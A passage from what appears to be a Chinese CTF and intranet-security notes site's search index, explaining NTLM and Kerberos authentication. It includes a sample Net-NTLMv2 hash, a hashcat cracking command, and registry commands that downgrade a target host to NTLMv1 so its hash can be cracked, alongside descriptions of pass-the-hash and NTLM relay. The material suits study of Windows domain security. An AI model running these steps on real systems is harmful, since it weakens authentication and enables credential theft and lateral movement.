\u5b9e\u73b0\u4e86\u4e0e\u5b89\u5168\u6709\u5173\u7684\u529f\u80fd\u51fd\u6570\uff0c\u56e0\u6b64\u4e0a\u5c42\u534f\u8bae(\u6bd4\u5982SMB\u3001HTTP\u3001LDAP)\u5728\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u7b49\u529f\u80fd\u7684\u65f6\u5019\uff0c\u5c31\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u534f\u8bae\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u8c03\u7528\u76f8\u5173\u7684\u51fd\u6570\u5373\u53ef\u3002\u800c\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u7684\u6d41\u91cf\u5d4c\u5165\u5728\u4e0a\u5c42\u534f\u8bae\u91cc\u9762\uff0c\u4e0d\u50cfKerbreos\uff0c\u65e2\u53ef\u4ee5\u9576\u5d4c\u5728\u4e0a\u5c42\u534f\u8bae\u91cc\u9762\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u72ec\u7acb\u7684\u5e94\u7528\u5c42\u534f\u8bae\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#2-ntlm","title":"2.\u57df\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1","text":"<p>\u57df\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1\u6d41\u7a0b\u56fe</p> <p></p> <p>\u5728\u57df\u73af\u5883\u4e2d\uff0c\u7531\u4e8e\u6240\u6709\u57df\u7528\u6237\u7684\u54c8\u5e0c\u503c\u90fd\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u7684<code>NTDS.dit</code>\u4e2d\uff0c\u670d\u52a1\u5668\u672c\u8eab\u65e0\u6cd5\u8ba1\u7b97Response\u6d88\u606f\uff0c\u56e0\u6b64\u9700\u8981\u4e0e\u57df\u63a7\u5efa\u7acb\u4e00\u4e2a\u5b89\u5168\u901a\u9053\uff0c\u5e76\u901a\u8fc7\u57df\u63a7\u5b8c\u6210\u6700\u540e\u7684\u8ba4\u8bc1\u6d41\u7a0b\u3002\u524d\u4e09\u4e2a\u6b65\u9aa4\u540c\u5de5\u4f5c\u7ec4\u73af\u5883\u7684\u8ba4\u8bc1</p> <p>1.\u5f53\u57df\u7528\u6237\u8f93\u5165\u81ea\u5df1\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u767b\u5f55\u5ba2\u6237\u7aef\u4e3b\u673a\u65f6\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u8f6c\u6362\u4e3aNTLM hash\u5e76\u7f13\u5b58\u3002\u5f53\u7528\u6237\u60f3\u8bbf\u95ee\u57df\u5185\u67d0\u53f0\u670d\u52a1\u5668\u4e0a\u7684\u8d44\u6e90\u65f6\uff0c\u5ba2\u6237\u7aef\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u9001TYPE1 Negotiate\u6d88\u606f 2.\u540cNTLM\u5728\u5de5\u4f5c\u7ec4\u73af\u5883\u4e2d\u7684\u8ba4\u8bc1 3.\u540cNTLM\u5728\u5de5\u4f5c\u7ec4\u73af\u5883\u4e2d\u7684\u8ba4\u8bc1</p> <p>4.\u670d\u52a1\u5668\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u6765\u7684TYPE 3\u6d88\u606f\u540e\uff0c\u4f1a\u5c06\u6d88\u606f\u901a\u8fc7 <code>Netlogon</code>\u534f\u8bae\u8f6c\u53d1\u7ed9\u57df\u63a7\u5236\u5668\u3002 5.\u57df\u63a7\u5236\u5668\u6839\u636eTYPE 3\u6d88\u606f\u4e2d\u7684\u7528\u6237\u540d\u83b7\u53d6\u8be5\u7528\u6237\u540d\u7684NTLM hash\uff0c\u7528NTLM hash\u5bf9\u539f\u59cb\u7684Challenge\u8fdb\u884c\u52a0\u5bc6\u5e76\u751f\u6210Response\uff0c\u7136\u540e\u5c06\u5176\u4e0eTYPE 3\u6d88\u606f\u4e2dResponse\u5bf9\u6bd4\u3002\u5982\u679c\u4e00\u81f4\uff0c\u5c31\u8bc1\u660e\u5ba2\u6237\u7aef\u638c\u63e1\u4e86\u670d\u52a1\u5668\u5bc6\u7801\uff0c\u8ba4\u8bc1\u6210\u529f\uff0c\u5426\u5219\u8ba4\u8bc1\u5931\u8d25\u3002 6.\u670d\u52a1\u5668\u6839\u636e\u57df\u63a7\u8fd4\u56de\u7684\u9a8c\u8bc1\u7ed3\u679c\uff0c\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u76f8\u5e94\u7684\u56de\u590d\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#3net-ntlm-hash","title":"3.Net-NTLM hash\u7ec4\u6210","text":"<p>Net-NTLM hash v2\u7684\u683c\u5f0f\u5982\u4e0b</p> <pre><code>username::domain:challenge:HMAC-MD5:blob\n</code></pre> <p>username\u548cdomain\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u91ccdomain\u4e3aNULL\u5373\u4e3a\u7a7a</p> <p></p> <p>challenge</p> <p></p> <p>HMAC-MD5\u5bf9\u5e94\u6570\u636e\u5305\u4e2d\u7684NTProofStr</p> <p></p> <p>blob\u5bf9\u5e94NTLM Response\u503c\u4e2d\u53bb\u6389NTProofStr\u503c\u540e\u5269\u4f59\u7684\u540e\u534a\u90e8\u5206\uff0c\u5982\u4e0b</p> <p></p> <p></p> <p>\u6240\u4ee5\u5b8c\u6574\u7684NTLMv2\u6570\u636e\u4e3a\u5982\u4e0b\uff0c\u6b64\u6570\u636e\u4e3aNet-NTLM hash\u3002</p> <pre><code>username::domain:challenge:HMAC-MD5:blob\nadministrator::: de80d8c98d613290: 2d10d365458e1d0477882e2f9ad26d12:010100000000000065bd67e73550d90172b7652a991cd25c0000000002001000410044004d0049004e002d005000430001001000410044004d0049004e002d005000430004001000610064006d0069006e002d005000430003001000610064006d0069006e002d00500043000700080065bd67e73550d90106000400020000000800300030000000000000000000000000300000a1eda9cbf6aefc8eb7eb43b5db4c6f011f5a8dbb4fd5bfa1192814b27b579fc70a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320035002e00310033003000000000000000000000000000\n</code></pre> <p>\u7136\u540e\u4f7f\u7528hashcat\u5373\u53ef\u7834\u89e3,\u628ahash\u653e\u8fdbhash.txt\u4e2d\uff0c\u6267\u884c\u5982\u4e0b</p> <pre><code>hashcat.exe -m 5600 hash.txt pass.txt\n</code></pre> <p>\u83b7\u53d6\u51fa\u660e\u6587\u5bc6\u7801win7.com</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#4ntlm-v1-ntlm-v2","title":"4.NTLM v1 \u548c NTLM v2 \u7684\u533a\u522b","text":"<p>NTLM v1\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u548cNTLM v2\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u662fNTLM \u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u7684\u4e0d\u540c\u7248\u672c\u3002\u76ee\u524d\u4f7f\u7528\u6700\u591a\u7684\u662fNTLM v2\u7248\u672c\u3002NTLM v1\u4e0eNTLM v2\u6700\u663e\u8457\u7684\u533a\u522b\u5c31\u662fChallenge\u8d28\u8be2\u503c\u4e0d\u540c\u548c\u52a0\u5bc6\u7b97\u6cd5\u4e0d\u540c\uff0c\u5171\u540c\u4e4b\u5904\u5c31\u662f\u90fd\u662f\u4f7f\u7528\u7684\u662fNTLM Hash\u8fdb\u884c\u52a0\u5bc6\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#challenge","title":"Challenge \u8d28\u8be2\u503c\uff1a","text":"<p>\u2013 NTLM v1\uff1a 8 \u5b57\u8282 \u2013 NTLM v2\uff1a16 \u5b57\u8282</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#net-ntlm-hash","title":"Net-NTLM Hash \u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1a","text":"<p>\u2013 NTLM v1\uff1aDES \u52a0\u5bc6\u7b97\u6cd5 \u2013 NTLM v2\uff1aHMAC-MD5 \u52a0\u5bc6\u7b97\u6cd5</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#ntlm_3","title":"NTLM \u534f\u8bae\u7684\u5b89\u5168\u95ee\u9898","text":"<p>\u5728\u4e0a\u9762NTLM\u8ba4\u8bc1\u7684\u6d41\u7a0b\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5728Type 3 Auth\u8ba4\u8bc1\u6d88\u606f\u4e2d\u662f\u4f7f\u7528\u7528\u6237\u5bc6\u7801\u7684Hash\u8ba1\u7b97\u7684\u3002\u56e0\u6b64\u5f53\u6211\u4eec\u6ca1\u6709\u62ff\u5230\u7528\u6237\u5bc6\u7801\u7684\u660e\u6587\u800c\u53ea\u62ff\u5230Hash\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884cPass The Hash(PTH)\u653b\u51fb\uff0c\u4e5f\u5c31\u662f\u5927\u5bb6\u6240\u8bf4\u7684\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002\u540c\u6837\uff0c\u8fd8\u662f\u5728Type3\u6d88\u606f\u4e2d\uff0c\u5b58\u5728Net-NTLM Hash\uff0c\u5f53\u653b\u51fb\u8005\u83b7\u5f97\u4e86 Net- NTLM Hash \u540e\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u91cd\u653e Net-NTLM Hash\uff0c\u8fd9\u79cd\u653b\u51fb\u624b\u6cd5\u4e5f \u5c31\u662f\u5927\u5bb6\u6240\u8bf4\u7684 NTLM Relay(NTLM \u4e2d\u7ee7)\u653b\u51fb\u3002\u5e76\u4e14\u7531\u4e8e NTLM v1 \u7248\u672c\u534f\u8bae\u52a0\u5bc6\u8fc7\u7a0b\u5b58\u5728\u5929\u7136\u7f3a\u9677\uff0c\u53ef\u4ee5\u5bf9 Net-NTLM v1 Hash \u8fdb\u884c\u7206\u7834\uff0c\u5f97\u5230 NTLM Hash\u3002\u62ff\u5230 NTLM Hash \u540e\u5373\u53ef\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#1pass-the-hash","title":"1.Pass The Hash","text":"<p>Pass The Hash(PTH)\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u662f\u5185\u7f51\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u4e3b\u8981\u539f\u56e0\u662fNTLM\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u662f\u7528\u6237\u5bc6\u7801\u7684NTLM Hash \u6765\u8fdb\u884c\u52a0\u5bc6\u3002\u56e0\u6b64\u5f53\u6211\u4eec\u83b7\u53d6\u5230\u4e86\u7528\u6237\u5bc6\u7801\u7684 NTLM Hash \u800c\u6ca1\u6709\u89e3\u51fa\u660e\u6587\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5 NTLM Hash \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u5bf9\u5185\u7f51\u5176\u4ed6\u673a\u5668\u8fdb\u884c Hash \u78b0\u649e\uff0c\u78b0\u649e\u5230\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u673a\u5668\u3002\u7136\u540e\u901a\u8fc7 135 \u6216 445 \u7aef\u53e3\u6a2a\u5411\u79fb\u52a8\u5230\u4f7f\u7528\u8be5\u5bc6\u7801\u7684\u5176\u4ed6\u673a\u5668\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#2ntlm-relay","title":"2.NTLM Relay","text":"<p>NTLM Relay \u5176\u5b9e\u4e25\u683c\u610f\u4e49\u4e0a\u5e76\u4e0d\u80fd\u53eb NTLM Relay\uff0c\u800c\u662f\u5e94\u8be5\u53eb Net-NTLM Relay\u3002\u5b83\u662f\u53d1\u751f\u5728 NTLM \u8ba4\u8bc1\u7684\u7b2c\u4e09\u6b65\uff0c\u5728 Response \u6d88\u606f\u4e2d\u5b58\u5728 Net-NTLM Hash\uff0c\u5f53\u653b\u51fb\u8005\u83b7\u5f97\u4e86 Net-NTLM Hash \u540e\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u91cd\u653e Net- NTLM Hash\uff0c\u8fd9\u79cd\u653b\u51fb\u624b\u6cd5\u4e5f\u5c31\u662f\u5927\u5bb6\u6240\u8bf4\u7684 NTLM Relay(NTLM \u4e2d\u7ee7)\u653b\u51fb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#3net-ntlm-v1-hash","title":"3.Net-NTLM v1 Hash \u7834\u89e3","text":"<p>\u7531\u4e8e NTLM v1 \u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u52a0\u5bc6\u8fc7\u7a0b\u5b58\u5728\u5929\u7136\u7f3a\u9677\uff0c\u53ea\u8981\u83b7\u53d6\u5230 Net-NTLM v1Hash\uff0c\u90fd\u80fd\u7834\u89e3\u4e3a NTLM hash\uff0c\u8fd9\u4e0e\u5bc6\u7801\u5f3a\u5ea6\u65e0\u5173\u3002\u5728\u57df\u73af\u5883\u4e2d\u8fd9\u66f4\u6709\u6548\uff0c\u56e0\u4e3a\u57df\u4e2d\u4f7f\u7528 hash \u5373\u53ef\u8fdc\u7a0b\u8fde\u63a5\u76ee\u6807\u673a\u5668\u3002\u5982\u679c\u57df\u63a7\u5141\u8bb8\u53d1\u9001 NTLM v1 \u54cd\u5e94\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0e\u57df\u63a7\u673a\u5668\u8fdb\u884c NTLM \u8ba4\u8bc1\uff0c\u7136\u540e\u6293\u53d6\u57df\u63a7\u7684 Net-NTLM v1Hash\uff0c\u7834\u89e3\u4e3a NTLM Hash\u3002\u4f7f\u7528\u57df\u63a7\u7684\u673a\u5668\u8d26\u53f7\u548c\u54c8\u5e0c\u5373\u53ef\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u54c8\u5e0c\uff01</p> <p>\u4f46\u662f\u81ea\u4ece Windows Vista \u5f00\u59cb\uff0c\u5fae\u8f6f\u5c31\u9ed8\u8ba4\u4f7f\u7528 NTLM v2 \u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\uff0c\u8981\u60f3\u964d\u7ea7\u5230 NTLM v1 \u7684\u8bdd\uff0c\u9700\u8981\u624b\u52a8\u8fdb\u884c\u4fee\u6539\uff0c\u5e76\u4e14\u9700\u8981\u76ee\u6807\u4e3b\u673a\u7684\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u5982\u4e0b\u64cd\u4f5c\u5f00\u542f\u76ee\u6807\u4e3b\u673a\u652f\u6301 NTLM v1 \u54cd\u5e94\uff1a</p> <p>\u6253\u5f00\u672c\u5730\u5b89\u5168\u7b56\u7565\u2014\u2014&gt;\u5b89\u5168\u8bbe\u7f6e\u2014\u2014&gt;\u672c\u5730\u7b56\u7565\u2014\u2014&gt;\u5b89\u5168\u9009\u9879\u2014\u2014&gt;\u7f51\u7edc\u5b89\u5168:LAN \u7ba1\u7406\u5668\u8eab\u4efd\u9a8c\u8bc1\u7ea7\u522b\u3002</p> <p></p> <p>\u7136\u540e\u5c06\u5176\u4fee\u6539\u4e3a\u4ec5\u53d1\u9001 NTLM \u54cd\u5e94\uff0c\u5982\u56fe</p> <p></p> <p>\u6216\u8005\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u4fee\u6539\u6ce8\u518c\u8868\uff1a</p> <pre><code>#\u4fee\u6539\u6ce8\u518c\u8868\u5f00\u542f Net-NTLM v1:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t\nREG_DWORD /d 2 /f\n#\u4e3a\u786e\u4fdd Net-NTLMv1 \u5f00\u542f\u6210\u529f\uff0c\u518d\u4fee\u6539\u4e24\u5904\u6ce8\u518c\u8868\u952e\u503c\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v NtlmMinClient\nSec /t REG_DWORD /d 536870912 /f\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v RestrictSendi\nngNTLMTraffic /t REG_DWORD /d 0 /f\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u4fee\u6539\u6ce8\u518c\u8868\u6210\u529f\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html","title":"Kerberos \u534f\u8bae\u8be6\u89e3","text":"<p>Kerberos\u534f\u8bae\u662f\u7531\u9ebb\u7701\u7406\u5de5\u5b66\u9662\u63d0\u51fa\u7684\u4e00\u79cd\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u5f00\u653e\u7684\u975e\u5b89\u5168\u7f51\u7edc\u4e2d\u8ba4\u8bc1\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u4fe1\u606f\u7684\u65b9\u6cd5\u3002\u5b83\u65e8\u5728\u901a\u8fc7\u4f7f\u7528\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\u4e3a\u5ba2\u6237\u7aef/\u670d\u52a1\u7aef\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u5f3a\u8eab\u4efd\u9a8c\u8bc1\u3002Kerberos \u662f\u897f\u65b9\u795e\u8bdd\u4e2d\u5b88\u536b\u5730\u72f1\u4e4b\u95e8\u7684\u4e09\u5934\u72ac\u7684\u540d\u5b57\u3002\u4e4b\u6240\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u540d\u5b57\u662f\u56e0\u4e3a Kerberos \u9700\u8981\u4e09\u65b9\u7684\u5171\u540c\u53c2\u4e0e\u624d\u80fd\u5b8c\u6210\u4e00\u6b21\u8ba4\u8bc1\u6d41\u7a0b\u3002\u76ee\u524d\u4e3b\u6d41\u4f7f\u7528\u7684 Kerberos \u7248\u672c\u4e3aKerberosV5 \u7248\u672c\uff0cWindows\u3001Linux \u548c Mac OS \u5747\u652f\u6301 Kerberos \u534f\u8bae\u3002</p> <p></p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#kerberos_1","title":"Kerberos \u57fa\u7840","text":"<p>\u5728 Kerberos \u534f\u8bae\u4e2d\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u89d2\u8272\uff1a</p> <ul> <li>\u8bbf\u95ee\u670d\u52a1\u7684\u5ba2\u6237\u7aef\uff1aKerberos \u5ba2\u6237\u7aef\u662f\u4ee3\u8868\u9700\u8981\u8bbf\u95ee\u8d44\u6e90\u7684\u7528\u6237\u8fdb\u884c\u64cd\u4f5c\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982\u6253\u5f00\u6587\u4ef6\u3001\u67e5\u8be2\u6570\u636e\u5e93\u6216\u6253\u5370\u6587\u6863\u3002\u6bcf\u4e2a Kerberos \u5ba2\u6237\u7aef\u5728\u8bbf\u95ee\u8d44\u6e90\u4e4b\u524d\u90fd\u4f1a\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>\u63d0\u4f9b\u670d\u52a1\u7684\u670d\u52a1\u7aef\uff1a\u57df\u5185\u63d0\u4f9b\u670d\u52a1\u7684\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u90fd\u6709\u4e00\u4e2a\u72ec\u4e00\u7684SPN\u3002</li> <li>\u63d0\u4f9b\u8ba4\u8bc1\u670d\u52a1\u7684 KDC(Key Distribution Center\uff0c\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3)\uff1aKDC \u5bc6\u94a5\u53d1\u884c\u4e2d\u5fc3\u662f\u4e00\u79cd\u7f51\u7edc\u670d\u52a1\uff0c\u5b83\u5411\u6d3b\u52a8\u76ee\u5f55\u57df\u5185\u7684\u7528\u6237\u548c\u8ba1\u7b97\u673a\u63d0\u4f9b\u4f1a\u8bdd\u7968\u636e\u548c\u4e34\u65f6\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u5176\u670d\u52a1\u5e10\u6237\u4e3a <code>krbtgt</code>\u3002KDC \u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1ADDS \u7684\u4e00\u90e8\u5206\u8fd0\u884c\u5728\u6bcf\u4e2a\u57df\u63a7\u5236\u5668\u4e0a\u3002</li> </ul> <p>\u8fd9\u91cc\u8bf4\u4e00\u4e0b krbtgt \u5e10\u6237\uff0c\u8be5\u7528\u6237\u662f\u5728\u521b\u5efa\u6d3b\u52a8\u76ee\u5f55\u65f6\u7cfb\u7edf\u81ea\u52a8\u521b\u5efa\u7684\u4e00\u4e2a\u8d26\u53f7\uff0c\u5176\u4f5c\u7528\u662f KDC \u5bc6\u94a5\u53d1\u884c\u4e2d\u5fc3\u7684\u670d\u52a1\u8d26\u53f7\uff0c\u5176\u5bc6\u7801\u662f\u7cfb\u7edf\u968f\u673a\u751f\u6210\u7684\uff0c\u65e0\u6cd5\u6b63\u5e38\u767b\u9646\u4e3b\u673a\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 krbtgt \u5e10\u6237\u7684\u4fe1\u606f\u3002</p> <p></p> <p>Kerberos\u662f\u4e00\u79cd\u57fa\u4e8e\u7968\u636eTicket\u7684\u8ba4\u8bc1\u65b9\u5f0f\u3002\u5ba2\u6237\u7aef\u60f3\u8981\u8bbf\u95ee\u670d\u52a1\u7aef\u7684\u67d0\u4e2a\u670d\u52a1\uff0c\u9996\u5148\u9700\u8981\u8d2d\u4e70\u670d\u52a1\u7aef\u8ba4\u53ef\u7684ST\u670d\u52a1\u7968\u636e(Service Ticket).\u4e5f\u5c31\u662f\u8bf4\uff0c\u5ba2\u6237\u7aef\u5728\u8bbf\u95ee\u670d\u52a1\u4e4b\u524d\u9700\u8981\u5148\u8d2d\u4e70\u597d\u7968\uff0c\u7b49\u5f85\u670d\u52a1\u9a8c\u7968\u4e4b\u540e\u624d\u80fd\u8bbf\u95ee\u3002\u4f46\u662f\u8fd9\u5f20\u7968\u5e76\u4e0d\u80fd\u76f4\u63a5\u8d2d\u4e70\uff0c\u9700\u8981\u4e00\u5f20TGT\u8ba4\u8d2d\u6743\u8bc1(Ticket Granting Ticket).\u4e5f\u5c31\u662f\u8bf4\uff0c\u5ba2\u6237\u7aef\u5728\u4e70\u7968\u4e4b\u524d\u5fc5\u987b\u5148\u83b7\u5f97\u4e00\u5f20TGT\u8ba4\u8d2d\u6743\u8bc1\u3002TGT\u8ba4\u8d2d\u6743\u8bc1\u548cST\u670d\u52a1\u7968\u636e\u5747\u662f\u7531KDC(\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3)\u53d1\u653e\uff1b\u56e0\u4e3aKDC\u662f\u8fd0\u884c\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684\uff0c\u6240\u4ee5\u8bf4TGT\u8ba4\u8d2d\u6743\u8bc1\u548cST\u670d\u52a1\u7968\u636e\u5747\u662f\u7531\u57df\u63a7\u53d1\u653e\u7684\u3002</p> <p>Kerberos \u4f7f\u7528 TCP/UDP 88 \u7aef\u53e3\u8fdb\u884c\u8ba4\u8bc1\uff0c\u4f7f\u7528 TCP/UDP 464 \u7aef\u53e3\u8fdb\u884c\u5bc6\u7801\u91cd\u8bbe\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u57df\u63a7\u5236\u5668 AD01 \u4e0a\u5f00\u653e\u7684 88 \u548c 464 \u7aef\u53e3\u3002</p> <p></p> <p>Kerberos \u4e2d\u4e00\u4e9b\u540d\u8bcd\u7684\u7b80\u79f0\u53ca\u542b\u4e49\uff1a</p> <pre><code>\u7b80\u79f0                \u5168\u62fc\nDC                  Domain Controller\uff0c\u57df\u63a7\nkrbtgt              KDC \u5bc6\u94a5\u53d1\u884c\u4e2d\u5fc3\u670d\u52a1\u8d26\u6237\nKDC                 Key Distribution Center\uff1a\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\uff0c\u7531\u57df\u63a7\u62c5\u4efb\nAD                  Active Directory\uff1a\u6d3b\u52a8\u76ee\u5f55\uff0c\u91cc\u9762\u5305\u542b\u57df\u5185\u7528\u6237\u6570\u636e\u5e93\nAS                  Authentication Service\uff1a\u8ba4\u8bc1\u670d\u52a1\nTGT                 Ticket Granting Ticket\uff1aTGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u7531 KDC \u7684 AS \u8ba4\u8bc1\u670d\u52a1\u53d1\u653e\nTGS                 Ticket Granting Service\uff1a\u7968\u636e\u6388\u4e88\u670d\u52a1\nST                  Service Ticket\uff1aST \u670d\u52a1\u7968\u636e\uff0c\u7531 KDC \u7684 TGS \u7968\u636e\u6388\u4e88\u670d\u52a1\u53d1\u653e\n</code></pre> <p>Kerberos \u534f\u8bae\u6709\u4e24\u4e2a\u57fa\u7840\u8ba4\u8bc1\u6a21\u5757\uff1a<code>AS_REQ &amp; AS_REP \u548c TGS_REQ &amp;TGS_REP</code> \uff0c\u4ee5\u53ca\u5fae\u8f6f\u6269\u5c55\u7684\u4e24\u4e2a\u8ba4\u8bc1\u6a21\u5757 <code>S4U</code> \u548c <code>PAC</code> \u3002S4U \u662f\u5fae\u8f6f\u4e3a\u4e86\u5b9e\u73b0\u59d4\u6d3e\u800c\u6269\u5c55\u7684\u6a21\u5757\uff0c\u5206\u4e3a <code>S4U2Self</code> \u548c <code>S4U2Proxy</code> \u3002\u5728 Kerberos \u6700\u521d\u8bbe\u8ba1\u7684\u6d41\u7a0b\u91cc\u53ea\u8bf4\u660e\u4e86\u5982\u4f55\u8bc1\u660e\u5ba2\u6237\u7aef\u7684\u771f\u5b9e\u8eab\u4efd\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bf4\u660e\u5ba2\u6237\u7aef\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u8be5\u670d\u52a1\uff0c\u56e0\u4e3a\u5728\u57df\u4e2d\u4e0d\u540c\u6743\u9650\u7684\u7528\u6237\u80fd\u591f\u8bbf\u95ee\u7684\u8d44\u6e90\u662f\u4e0d\u540c\u7684\u3002\u56e0\u6b64\u5fae\u8f6f\u4e3a\u4e86\u89e3\u51b3\u6743\u9650\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f15\u5165\u4e86 <code>PAC (Privilege Attribute Certificate\uff0c\u7279\u6743\u5c5e\u6027\u8bc1\u4e66)</code>\u7684\u6982\u5ff5\u3002</p> <p>\u5728\u5206\u6790 AS_REQ &amp; AS_REP \u548c TGS_REQ &amp; TGS_REP \u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u4ec0\u4e48\u662f PAC\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#pac","title":"PAC \u7279\u6743\u5c5e\u6027\u8bc1\u4e66","text":"<p><code>PAC (Privilege Attribute Certificate\uff0c\u7279\u6743\u5c5e\u6027\u8bc1\u4e66)</code>\uff0c\u5176\u4e2d\u6240\u5305\u542b\u7684\u662f\u5404\u79cd\u6388\u6743\u4fe1\u606f\u3001\u9644\u52a0\u51ed\u636e\u4fe1\u606f\u3001\u914d\u7f6e\u6587\u4ef6\u548c\u7b56\u7565\u4fe1\u606f\u7b49\u3002\u4f8b\u5982\u7528\u6237\u6240\u5c5e\u7684\u7528\u6237\u7ec4\uff0c \u7528\u6237\u6240\u5177\u6709\u7684\u6743\u9650\u7b49\u3002\u5728\u6700\u521d\u7684 RFC1510 \u4e2d\u89c4\u5b9a\u7684\u6807\u51c6 Kerberos \u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709PAC\uff0c\u5fae\u8f6f\u5728\u81ea\u5df1\u7684\u4ea7\u54c1\u4e2d\u6240\u5b9e\u73b0\u7684 Kerberos \u6d41\u7a0b\u52a0\u5165\u4e86 PAC \u7684\u6982\u5ff5\uff0c\u56e0\u4e3a\u5728\u57df\u4e2d\u4e0d\u540c\u6743\u9650\u7684\u7528\u6237\u80fd\u591f\u8bbf\u95ee\u7684\u8d44\u6e90\u662f\u4e0d\u540c\u7684\uff0c\u56e0\u6b64\u5fae\u8f6f\u8bbe\u8ba1 PAC \u7528\u6765\u8fa8\u522b\u7528\u6237\u8eab\u4efd\u548c\u6743\u9650.</p> <p>\u5728\u4e00\u4e2a\u6b63\u5e38\u7684 Kerberos \u8ba4\u8bc1\u6d41\u7a0b\u4e2d\uff0cKDC \u8fd4\u56de\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u548c ST \u670d\u52a1\u7968\u636e\u4e2d\u90fd\u662f\u5e26\u6709 PAC \u7684\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u5c31\u662f\u5728\u4ee5\u540e\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\u4e2d\uff0c 